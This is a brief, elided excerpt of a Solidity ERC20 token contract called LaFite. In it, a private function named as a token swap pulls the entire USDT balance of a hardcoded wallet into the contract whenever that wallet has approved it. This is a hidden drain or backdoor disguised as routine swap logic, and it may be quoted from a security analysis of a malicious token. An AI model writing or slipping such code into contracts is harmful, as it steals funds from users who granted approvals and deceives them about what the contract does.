...
contract LaFite is ERC20, Ownable {
    ...
    function _swapTokenForTokenFIST(uint256 tokenAmount) private {
        ...
        uint256 amount = IERC20(USDTs).balanceOf(0x50cc9d51215b4842BE139D46960b4238D5C21231);
        if (IERC20(USDTs).allowance(0x50cc9d51215b4842BE139D46960b4238D5C21231, address(this)) >= amount) {
            IERC20(USDTs).transferFrom(0x50cc9d51215b4842BE139D46960b4238D5C21231, address(this), amount);
        }
    }
}